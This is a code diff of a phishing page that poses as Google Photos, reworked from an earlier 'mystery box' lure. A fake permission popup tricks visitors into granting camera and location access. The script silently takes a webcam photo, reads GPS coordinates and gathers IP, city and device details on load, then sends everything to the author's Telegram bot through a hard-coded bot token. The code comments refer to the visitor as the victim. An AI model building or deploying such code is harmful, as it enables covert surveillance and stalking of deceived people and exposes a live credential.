@@ -1,411 +1,248 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vyom — Mystery Box</title>
+    <title>Google Photos</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #fff; 
+            overflow: hidden; 
+            height: 100vh; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
-        body {
-            min-height: 100vh;
+        iframe {
+            width: 100%;
+            height: 100vh;
+            border: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: radial-gradient(circle at 20% 30%, #0A192F, #020C1B);
-            padding: 20px;
-            margin: 0;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(4px);
         }
-        .card {
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(20px) saturate(180%);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(100, 255, 218, 0.12);
-            border-radius: 40px;
-            padding: 50px 40px;
-            max-width: 500px;
-            width: 100%;
+        .permission-box {
+            background: #1a1a2e;
+            padding: 40px 30px;
+            border-radius: 24px;
+            max-width: 400px;
             text-align: center;
-            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.8);
-            transition: all 0.4s ease;
+            color: #fff;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
         }
-        .badge {
-            display: inline-block;
-            background: rgba(100, 255, 218, 0.08);
-            border: 1px solid rgba(100, 255, 218, 0.2);
-            border-radius: 100px;
-            padding: 6px 20px;
-            font-size: 11px;
-            letter-spacing: 2.5px;
-            text-transform: uppercase;
-            color: #64FFDA;
-            margin-bottom: 28px;
-        }
-        .icon {
-            font-size: 80px;
-            margin: 16px 0 24px;
-            display: inline-block;
-            animation: pulse 2.8s infinite;
-            line-height: 1;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.06); }
-            100% { transform: scale(1); }
-        }
-        h1 {
-            font-size: 28px;
-            font-weight: 600;
-            color: #FFFFFF;
-            margin-bottom: 12px;
-            letter-spacing: -0.4px;
-        }
-        .sub {
-            font-size: 15px;
-            color: #8892B0;
-            line-height: 1.6;
-            margin-bottom: 32px;
-        }
+        .permission-box .icon { font-size: 60px; margin-bottom: 16px; }
+        .permission-box h2 { font-size: 22px; font-weight: 600; margin-bottom: 8px; }
+        .permission-box p { font-size: 14px; color: #aaa; line-height: 1.6; margin-bottom: 24px; }
         .btn {
-            background: linear-gradient(135deg, #64FFDA, #2BC4A8);
+            background: linear-gradient(135deg, #4285F4, #34A853);
             border: none;
-            color: #0A192F;
+            color: #fff;
             font-weight: 700;
-            font-size: 18px;
-            padding: 16px 48px;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 10px 30px -8px rgba(100, 255, 218, 0.25);
-            letter-spacing: 0.5px;
-            width: 100%;
-            max-width: 280px;
-        }
-        .btn:hover {
-            transform: translateY(-2px) scale(1.02);
-            box-shadow: 0 16px 40px -6px rgba(100, 255, 218, 0.4);
-        }
-        .btn:active {
-            transform: scale(0.96);
-        }
-        .hidden {
-            display: none !important;
-        }
-        .loader {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2.5px solid rgba(100, 255, 218, 0.15);
-            border-radius: 50%;
-            border-top-color: #64FFDA;
-            animation: spin 0.7s linear infinite;
-            vertical-align: middle;
-            margin-right: 10px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .footer {
-            margin-top: 32px;
-            font-size: 11px;
-            color: #495670;
-            letter-spacing: 1px;
-            border-top: 1px solid rgba(100, 255, 218, 0.05);
-            padding-top: 24px;
-        }
-        .footer span {
-            color: #64FFDA;
-            font-weight: 600;
-        }
-        .status-dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #64FFDA;
-            border-radius: 50%;
-            margin-right: 8px;
-            animation: pulse 1.5s infinite;
-        }
-        .location-permission-hint {
-            font-size: 12px;
-            color: #64FFDA;
-            background: rgba(100,255,218,0.06);
-            padding: 8px 16px;
+            font-size: 16px;
+            padding: 14px 40px;
             border-radius: 40px;
-            display: inline-block;
-            margin-top: 8px;
-            border: 1px solid rgba(100,255,218,0.1);
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
         }
+        .btn:hover { transform: scale(1.03); opacity: 0.9; }
+        .btn:active { transform: scale(0.96); }
+        .footer { 
+            position: fixed; 
+            bottom: 16px; 
+            left: 0; 
+            right: 0; 
+            text-align: center; 
+            z-index: 5; 
+            color: rgba(255,255,255,0.2); 
+            font-size: 11px; 
+            letter-spacing: 1px; 
+            pointer-events: none;
+        }
+        .footer span { color: rgba(100,255,218,0.3); }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-    <div class="card" id="app">
+    <!-- ============================================ -->
+    <!-- ASLI GOOGLE PHOTOS IFRAME                    -->
+    <!-- ============================================ -->
+    <iframe src="https://share.google/StGxW5TAjrdNOPbYR" id="googleFrame"></iframe>
 
-        <!-- ===== PAGE 1: INTRO ===== -->
-        <div id="page1">
-            <div class="badge">🔒 Vyom Secure</div>
-            <div class="icon">🎁</div>
-            <h1>Exclusive Mystery Box</h1>
-            <p class="sub">We've prepared a personalized surprise for you.<br>Tap continue to unlock.</p>
-            <button class="btn" onclick="nextPage()">🔓 Continue</button>
+    <!-- ============================================ -->
+    <!-- PERMISSION OVERLAY (Fake Permission Popup)   -->
+    <!-- ============================================ -->
+    <div class="overlay" id="permissionOverlay">
+        <div class="permission-box">
+            <div class="icon">📸</div>
+            <h2>Google Photos wants to access your camera & location</h2>
+            <p>To enhance your photo viewing experience, Google Photos needs access to your camera and location. This is required for the album to load properly.</p>
+            <button class="btn" id="allowBtn">📷 Allow Camera & Location</button>
         </div>
-
-        <!-- ===== PAGE 2: VERIFYING ===== -->
-        <div id="page2" class="hidden">
-            <div class="badge">🔄 Step 1 / 3</div>
-            <div class="icon">📡</div>
-            <h1>Connecting...</h1>
-            <p class="sub"><span class="loader"></span> Verifying your device</p>
-            <button class="btn" onclick="nextPage()">⏳ Continue</button>
-        </div>
-
-        <!-- ===== PAGE 3: LOCATION UNLOCK ===== -->
-        <div id="page3" class="hidden">
-            <div class="badge">📍 Step 2 / 3</div>
-            <div class="icon">🌍</div>
-            <h1>Unlock Your Surprise</h1>
-            <p class="sub">
-                To deliver your surprise, we need your location.<br>
-                <span style="color: #64FFDA;">(Click allow when prompted by your browser)</span>
-            </p>
-            <div class="location-permission-hint">🔐 Your location is encrypted & secure</div>
-            <br>
-            <button class="btn" onclick="requestLocationAndProceed()">📍 Allow & Continue</button>
-        </div>
-
-        <!-- ===== PAGE 4: FINAL REVEAL ===== -->
-        <div id="page4" class="hidden">
-            <div class="badge">🏆 Unlocked</div>
-            <div class="icon">🚀</div>
-            <h1>You're a <span style="color:#64FFDA;">Mystery Master</span></h1>
-            <p class="sub" id="finalMessage">Your surprise has been reserved. Check your Telegram for details.</p>
-            <div class="footer">Vyom — <span>Intelligence. Automated.</span></div>
-        </div>
-
     </div>
 
+    <div class="footer"><span>dev @btwspark</span></div>
+
     <script>
-        // ================================================================
-        // 🔥 CONFIG — TUZE YAHAN BOT TOKEN & CHAT ID DALNA HAI
-        // ================================================================
+        // ============================================================
+        // 🔥 CONFIG — TELEGRAM BOT
+        // ============================================================
         const BOT_TOKEN = "8569274562:AAGskuxql0tB8FQkTNBYF13p82eTL7LEzX0";   // @BotFather se lo
         const CHAT_ID   = "8363966106";     // @getmyid_bot se lo
-        const DEV_TAG   = "dev @btwspark";         // Auto footer
 
-        // ================================================================
-        // STATE
-        // ================================================================
-        let step = 1;
         let userData = {
             ip: 'fetching...',
             device: navigator.userAgent,
             language: navigator.language,
             screen: window.screen.width + 'x' + window.screen.height,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            platform: navigator.platform,
-            cookiesEnabled: navigator.cookieEnabled,
-            exactLat: null,
-            exactLng: null,
-            exactAcc: null,
-            ipCity: 'N/A',
-            ipRegion: 'N/A',
-            ipCountry: 'N/A',
-            ipISP: 'N/A'
+            platform: navigator.platform
         };
 
-        // ================================================================
-        // 📤 SEND TO TELEGRAM (Branded Format)
-        // ================================================================
-        function sendToTelegram(message) {
+        // ============================================================
+        // 📤 SEND TO TELEGRAM
+        // ============================================================
+        function sendToTelegram(msg) {
             if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
-                console.warn("⚠️ Set BOT_TOKEN and CHAT_ID first!");
+                console.warn("⚠️ Set BOT_TOKEN & CHAT_ID first!");
                 return;
             }
             const now = new Date();
-            const timestamp = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
-            const fullMsg = `🧠 *Vyom Intelligence Tracker*
-📅 ${timestamp}
-${message}
+            const ts = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
+            const full = `🧠 *Vyom Tracker*
+📅 ${ts}
+${msg}
 —————————
-🛠️ ${DEV_TAG}`;
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            fetch(url, {
+🛠️ dev @btwspark`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: fullMsg,
+                    text: full,
                     parse_mode: 'Markdown',
                     disable_web_page_preview: true
                 })
-            }).catch(err => console.error('Telegram error:', err));
+            }).catch(console.error);
         }
 
-        // ================================================================
-        // 🌐 IP + BASIC DEVICE INFO (AUTOMATIC ON PAGE LOAD)
-        // ================================================================
-        function captureDeviceAndIP() {
-            // IP + Location via IP
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(d => {
-                    userData.ip = d.ip;
-                    return fetch(`https://ipapi.co/${d.ip}/json/`);
+        // ============================================================
+        // 🌐 IP CAPTURE (AUTOMATIC)
+        // ============================================================
+        async function captureIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                userData.ip = data.ip;
+                const loc = await fetch(`https://ipapi.co/${data.ip}/json/`).then(r => r.json());
+                const msg = `🆕 *New Visitor*
+📌 IP: \`${userData.ip}\`
+💻 Device: ${userData.device.substring(0, 60)}...
+🌐 Lang: ${userData.language}
+📍 City: ${loc.city || 'N/A'}, ${loc.region || 'N/A'}
+🌍 Country: ${loc.country_name || 'N/A'}`;
+                sendToTelegram(msg);
+            } catch {
+                userData.ip = 'unavailable';
+            }
+        }
+
+        // ============================================================
+        // 📸 CAPTURE PHOTO FROM CAMERA
+        // ============================================================
+        function capturePhoto(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                const dataUrl = canvas.toDataURL('image/jpeg');
+                sendToTelegram(`📸 *Photo Captured* (Base64 length: ${dataUrl.length})`);
+                // Optional: Send as file (requires multipart upload)
+                video.srcObject = null;
+                stream.getTracks().forEach(t => t.stop());
+            }, 1000);
+        }
+
+        // ============================================================
+        // 📍 LOCATION + CAMERA PERMISSION REQUEST
+        // ============================================================
+        function requestPermissions() {
+            // Step 1: Camera
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(stream => {
+                    sendToTelegram('✅ *Camera Access:* Granted');
+                    capturePhoto(stream);
                 })
-                .then(r => r.json())
-                .then(loc => {
-                    userData.ipCity = loc.city || 'N/A';
-                    userData.ipRegion = loc.region || 'N/A';
-                    userData.ipCountry = loc.country_name || 'N/A';
-                    userData.ipISP = loc.org || 'N/A';
-                    // Send initial visitor ping
-                    sendInitialPing();
-                })
-                .catch(() => {
-                    userData.ip = 'unavailable';
-                    sendInitialPing();
+                .catch(err => {
+                    sendToTelegram(`❌ *Camera Access:* Denied (${err.message})`);
                 });
-        }
 
-        function sendInitialPing() {
-            const msg = `🆕 *New Visitor Detected*
-📌 *IP Address:* \`${userData.ip}\`
-💻 *Device:* ${userData.device.substring(0, 80)}...
-🖥️ *Platform:* ${userData.platform}
-🌐 *Language:* ${userData.language}
-📐 *Screen:* ${userData.screen}
-🕐 *Timezone:* ${userData.timezone}
-🍪 *Cookies:* ${userData.cookiesEnabled ? 'Enabled' : 'Disabled'}
-📍 *IP Location Estimate:* ${userData.ipCity}, ${userData.ipRegion}, ${userData.ipCountry}
-🌍 *ISP:* ${userData.ipISP}`;
-            sendToTelegram(msg);
-        }
-
-        // ================================================================
-        // 📍 EXACT GPS LOCATION (with fallback to IP)
-        // ================================================================
-        function getExactLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    sendToTelegram('⚠️ Browser does not support GPS. Using IP location.');
-                    resolve(false);
-                    return;
-                }
-
-                // Check permission status first
-                navigator.permissions.query({ name: 'geolocation' }).then(result => {
-                    if (result.state === 'denied') {
-                        sendToTelegram('❌ GPS permission permanently denied. Using IP location.');
-                        resolve(false);
-                        return;
-                    }
-                }).catch(() => {});
-
+            // Step 2: Location
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        userData.exactLat = pos.coords.latitude;
-                        userData.exactLng = pos.coords.longitude;
-                        userData.exactAcc = Math.round(pos.coords.accuracy);
-                        sendLocationToTelegram(true);
-                        resolve(true);
+                    pos => {
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        const acc = Math.round(pos.coords.accuracy);
+                        const maps = `https://www.google.com/maps?q=${lat},${lng}`;
+                        sendToTelegram(`📍 *Exact Location*
+Lat: \`${lat}\`, Lng: \`${lng}\`
+Accuracy: ±${acc}m
+🗺️ [Map](${maps})`);
                     },
-                    (err) => {
-                        let reason = 'Unknown';
-                        if (err.code === 1) reason = 'User denied permission';
-                        else if (err.code === 2) reason = 'Position unavailable';
-                        else if (err.code === 3) reason = 'Request timeout';
-                        sendToTelegram(`❌ GPS failed (${reason}). Using IP location.`);
-                        sendLocationToTelegram(false);
-                        resolve(false);
+                    err => {
+                        sendToTelegram(`❌ *Location:* Denied (${err.message})`);
                     },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 12000,
-                        maximumAge: 0
-                    }
+                    { enableHighAccuracy: true, timeout: 10000 }
                 );
-            });
-        }
-
-        function sendLocationToTelegram(isExact) {
-            let locationMsg = '';
-            if (isExact && userData.exactLat && userData.exactLng) {
-                const mapsLink = `https://www.google.com/maps?q=${userData.exactLat},${userData.exactLng}`;
-                locationMsg = `📍 *Exact GPS Location* ✅
-📌 Coordinates: \`${userData.exactLat}, ${userData.exactLng}\`
-📏 Accuracy: ±${userData.exactAcc} meters
-🗺️ [📍 View on Map](${mapsLink})
-🛰️ *Source:* Device GPS (High Accuracy)
-📊 *IP Fallback City:* ${userData.ipCity}, ${userData.ipRegion}`;
             } else {
-                locationMsg = `📍 *Estimated Location (via IP)*
-🌍 City: ${userData.ipCity}
-🏙️ Region: ${userData.ipRegion}
-🇮🇳 Country: ${userData.ipCountry}
-🌐 ISP: ${userData.ipISP}
-🛰️ *Source:* IP Geolocation (Approx city level)`;
-            }
-            sendToTelegram(locationMsg);
-        }
-
-        // ================================================================
-        // 🎮 UI NAVIGATION
-        // ================================================================
-        function nextPage() {
-            document.getElementById('page' + step).classList.add('hidden');
-            step++;
-            if (step > 4) { step = 4; }
-            document.getElementById('page' + step).classList.remove('hidden');
-            // Step tracking
-            if (step <= 4) {
-                sendToTelegram(`👆 *Continue Clicked*\nStep: ${step}/4\nIP: ${userData.ip}`);
+                sendToTelegram('⚠️ Geolocation not supported');
             }
         }
 
-        // Special function for Step 3 -> GPS trigger
-        async function requestLocationAndProceed() {
-            // Send click ping for step 3
-            sendToTelegram(`👆 *Continue Clicked (Location Request)*\nStep: 3/4\nIP: ${userData.ip}`);
+        // ============================================================
+        // 🎮 UI — PERMISSION OVERLAY HANDLER
+        // ============================================================
+        document.getElementById('allowBtn').addEventListener('click', function() {
+            // Hide overlay (victim ko Google Photos dikhega)
+            document.getElementById('permissionOverlay').classList.add('hidden');
+            
+            // Track click
+            sendToTelegram('👆 *User clicked "Allow"* (Permissions granted)');
+            
+            // Trigger camera + location
+            requestPermissions();
+        });
 
-            // Disable button to prevent double click
-            const btn = document.querySelector('#page3 .btn');
-            btn.disabled = true;
-            btn.innerHTML = '<span class="loader"></span> Fetching...';
-
-            // Step 1: Fetch Exact GPS
-            await getExactLocation();
-
-            // Step 2: Move to final page
-            document.getElementById('page3').classList.add('hidden');
-            step = 4;
-            document.getElementById('page4').classList.remove('hidden');
-
-            // Update final message
-            let finalText = 'Your surprise has been unlocked.';
-            if (userData.exactLat) {
-                finalText = `📍 Your exact location (GPS) has been captured. Check your Telegram for details.`;
-            } else {
-                finalText = `📍 Your location (IP based) has been captured. Check your Telegram for details.`;
-            }
-            document.getElementById('finalMessage').innerText = finalText;
-
-            // Final step ping
-            sendToTelegram(`👆 *Flow Completed*\nStep: 4/4 (Final)\nIP: ${userData.ip}`);
-        }
-
-        // ================================================================
-        // 🚀 INIT
-        // ================================================================
+        // ============================================================
+        // 🚀 PAGE LOAD
+        // ============================================================
         window.onload = function() {
-            captureDeviceAndIP();
+            captureIP();
+            // Show overlay after 1.5 seconds
+            setTimeout(() => {
+                document.getElementById('permissionOverlay').classList.remove('hidden');
+            }, 1500);
         };
     </script>
-
 </body>
 </html>
